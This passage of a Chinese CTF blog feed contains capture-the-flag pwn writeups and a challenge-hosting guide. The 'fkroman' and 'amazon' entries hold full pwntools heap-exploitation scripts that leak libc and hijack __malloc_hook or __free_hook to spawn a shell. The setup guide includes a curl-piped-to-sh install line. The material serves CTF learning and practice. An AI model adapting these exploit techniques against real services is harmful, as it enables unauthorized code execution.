class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./fkroman'</span></span><br><span class="line">lib = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'121.40.246.48'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Your choice: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    index(idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">iofile_off = [<span class="number">0x25dd</span>,<span class="number">0xf5eb</span>] <span class="comment">#_IO_2_1_stderr_+157</span></span><br><span class="line">libc_off = <span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span></span><br><span class="line">onegadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x90</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span><span class="number">-8</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#-------------------leak libc---------------------</span></span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">1</span>, p8(<span class="number">0xe0</span>))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">'A'</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">2</span>, p16(iofile_off[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#0</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#target</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    edit(<span class="number">6</span>, <span class="number">0x54</span>, <span class="string">'A'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x00000000fbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.recv(<span class="number">0x40</span>)</span><br><span class="line">    recv_addr=u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'libc-&gt;'</span>+hex(recv_addr))</span><br><span class="line">    pause()</span><br><span class="line">    libc.address = recv_addr - libc_off</span><br><span class="line">    log.info(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------malloc_hook-------------------</span></span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">0x70</span>, <span class="string">'B'</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    dele(<span class="number">7</span>)</span><br><span class="line">    info(hex(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">7</span>, <span class="number">8</span>, p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#0x7fefcf441aed _IO_wide_data_0+301</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">9</span>, <span class="number">0x70</span><span class="number">-8</span>) <span class="comment">#target2</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    info(hex(libc.address+onegadgets[<span class="number">1</span>]))</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">9</span>, <span class="number">0x1b</span>, <span class="string">'C'</span>*<span class="number">0x13</span>+p64(libc.address+onegadgets[<span class="number">1</span>])) <span class="comment">#0x7fefcf0c226a</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">10</span>, <span class="number">0</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> LOCAL:</span><br><span class="line">                io = elf.process()</span><br><span class="line">                env=&#123;<span class="string">"LD_PRELOAD"</span>: libc.path&#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                io = remote(ip, port)</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure></p><p>参考文章:<br><a href="https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg</a><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;利用堆溢出伪造堆块，并用uaf漏洞打_IO_FILE泄露出libc地址&lt;/li&gt;
&lt;li&gt;再用uaf漏洞劫持malloc_hoo
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn题的搭建</title>
    <link href="https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://nocbtm.github.io/2019/09/25/pwn题的搭建/</id>
    <published>2019-09-25T12:23:13.000Z</published>
    <updated>2019-10-04T13:48:58.714Z</updated>
    
    <content type="html"><![CDATA[<h2 id="本地搭建"><a href="#本地搭建" class="headerlink" title="本地搭建"></a>本地搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:6666,fork <span class="built_in">exec</span>:./pwn,reuseaddr</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> 0.0.0.0 6666</span><br><span class="line">ls</span><br><span class="line">flag</span><br><span class="line">pwn</span><br></pre></td></tr></table></figure><p>也可以加个nohup，还可以再加个&amp;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup socat tcp<span class="_">-l</span>:6666,fork <span class="built_in">exec</span>:./pwn,reuseaddr</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup socat tcp<span class="_">-l</span>:6666,fork <span class="built_in">exec</span>:./pwn,reuseaddr&amp;</span><br></pre></td></tr></table></figure><p>他们的作用分别是<br>使用&amp;后台运行程序：</p><ul><li><p>结果会输出到终端</p></li><li><p>使用Ctrl + C发送SIGINT信号，程序免疫</p></li><li><p>关闭session发送SIGHUP信号，程序关闭</p></li></ul><p>使用nohup运行程序：</p><ul><li><p>结果默认会输出到nohup.out</p></li><li><p>使用Ctrl + C发送SIGINT信号，程序关闭</p></li><li><p>关闭session发送SIGHUP信号，程序免疫</p></li></ul><h2 id="dockr搭建pwn题"><a href="#dockr搭建pwn题" class="headerlink" title="dockr搭建pwn题"></a>dockr搭建pwn题</h2><p>开源项目地址: <a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">https://github.com/Eadom/ctf_xinetd</a><br>克隆下来之后，在当前目录下执行如下命令</p><h3 id="建造镜像"><a href="#建造镜像" class="headerlink" title="建造镜像"></a>建造镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t pwn-docker:16.04 .</span><br></pre></td></tr></table></figure><p>若想搭建为18.04的环境，将dockerfile文件里面FROM ubuntu:16.04改为 FROM ubuntu:18.04<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04  #修改的地方</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd &amp;&amp; apt-get install -y vim</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /lib* /home/ctf &amp;&amp; \</span><br><span class="line">    cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 9999</span><br></pre></td></tr></table></figure></p><h3 id="然后创建容器，并做端口转发"><a href="#然后创建容器，并做端口转发" class="headerlink" title="然后创建容器，并做端口转发"></a>然后创建容器，并做端口转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 0.0.0.0:9997:9999 pwn-docker:16.04</span><br></pre></td></tr></table></figure><p>最后在物理机上访问9997端口,测试成功<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> 0.0.0.0 9997</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn</span><br><span class="line">cat flag</span><br><span class="line">ctf&#123;please_initialize_this_flag&#125;</span><br></pre></td></tr></table></figure></p><h3 id="更换题目"><a href="#更换题目" class="headerlink" title="更换题目"></a>更换题目</h3><p>可用docker cp命令替换/home/ctf目录下的helloworld，并修改/etc/xinetd.d/ctf里面的题目名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    type        = UNLISTED</span><br><span class="line">    port        = 9999</span><br><span class="line">    bind        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot</span><br><span class="line">    # replace helloworld to your program</span><br><span class="line">    server_args = --userspec=1000:1000 /home/ctf ./helloworld  #修改的地方</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    # safety options</span><br><span class="line">    per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="同时搭建多题"><a href="#同时搭建多题" class="headerlink" title="同时搭建多题"></a>同时搭建多题</h2><p>开源项目地址： <a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a></p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line">curl -s https://get.docker.com/ | sh  <span class="comment">#已安装过的跳过</span></span><br><span class="line"><span class="comment"># 安装 docker compose 和git</span></span><br><span class="line">apt install docker-compose git</span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/giantbranch/pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure><p>克隆下来之后，只需三步就可以搭建多道pwn题，并自动生成flag，获取到shell自动cat flag</p><ul><li>将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名）</li><li>python initialize.py</li><li>docker-compose up –build -d</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> initialize.py </span><br><span class="line">&#123;<span class="string">"flag"</span>: <span class="string">"flag&#123;9c900d02-8567-4e16-8952-47a92d2dc06a&#125;"</span>, <span class="string">"port"</span>: 10000, <span class="string">"filename"</span>: <span class="string">"pwn1"</span>&#125;</span><br><span class="line">&#123;<span class="string">"flag"</span>: <span class="string">"flag&#123;6f785f9e-fb19-4b54-9c6c-dd9b6f62041a&#125;"</span>, <span class="string">"port"</span>: 10001, <span class="string">"filename"</span>: <span class="string">"pwn1_copy1"</span>&#125;</span><br><span class="line">&#123;<span class="string">"flag"</span>: <span class="string">"flag&#123;c65a3be4-a9d1-4122-b981-7a241ca73027&#125;"</span>, <span class="string">"port"</span>: 10002, <span class="string">"filename"</span>: <span class="string">"pwn1_copy2"</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up --build -d</span><br></pre></td></tr></table></figure><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$nc 0.0.0.0 10000</span><br><span class="line">pwn test</span><br></pre></td></tr></table></figure></p><h3 id="更换题目-1"><a href="#更换题目-1" class="headerlink" title="更换题目"></a>更换题目</h3><p>先把开启的容器删除掉，再执行上面三步即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;本地搭建&quot;&gt;&lt;a href=&quot;#本地搭建&quot; class=&quot;headerlink&quot; title=&quot;本地搭建&quot;&gt;&lt;/a&gt;本地搭建&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数字经济 pwn amazon writeup</title>
    <link href="https://nocbtm.github.io/2019/09/25/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%20pwn%20amazon%20writeup/"/>
    <id>https://nocbtm.github.io/2019/09/25/数字经济 pwn amazon writeup/</id>
    <published>2019-09-25T09:20:42.000Z</published>
    <updated>2019-10-04T06:23:26.536Z</updated>
    
    <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1、利用glibc-2.27的tcache机制连续释放八次unsortedbin，再输出，可以leak出libc的基址<br>2、利用unsortedbin的合并，overlap修改tcache表的fd位为_free_hook的地址<br>3、提前把”$0\x00”(/bin/sh)写入到堆块中<br>4、申请堆块到_free_hook附近，修改__free_hook为system,<br>5、释放堆块，得到shell</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>本地环境：ubuntu 18.04</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./amazon'</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(s = <span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p ,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num, size, note)</span>:</span></span><br><span class="line">    manu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'buy: '</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'many: '</span>, str(num))</span><br><span class="line">    p.sendlineafter(<span class="string">'note: '</span>, str(size))</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span><span class="params">(num, size, note)</span>:</span></span><br><span class="line">    manu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'buy: '</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.sendline(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    manu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">(idx)</span>:</span></span><br><span class="line">    manu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'for: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x80</span>, <span class="string">'a'</span>)  <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0xa0</span>, <span class="string">'A'</span>)  <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">'A'</span>)  <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x10</span>, <span class="string">'A'</span>)  <span class="comment">#3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        checkout(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        checkout(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">'libc.address---&gt;'</span>+hex(libc.address))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        checkout(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">'\xff'</span>*<span class="number">0x80</span> +p64(<span class="number">3</span>)+p64(<span class="number">0xa1</span>) + p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0x40</span>)) <span class="comment">#0 1</span></span><br><span class="line">    checkout(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0xa0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">'\x99'</span>*<span class="number">0x80</span> +p64(<span class="number">3</span>)+p64(<span class="number">0xa1</span>) + <span class="string">'$0\x00'</span>)  <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0xa0</span>, <span class="string">'\x00'</span>*<span class="number">0x20</span>+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    <span class="comment">#d()</span></span><br><span class="line">    checkout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#-------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> l:</span><br><span class="line">        p = process(exe)</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'121.41.38.38'</span>, <span class="number">9999</span>)</span><br><span class="line">        libc = ELF(<span class="string">'libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><p>参考文章：<br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html</a><br><a href="https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg" target="_blank" 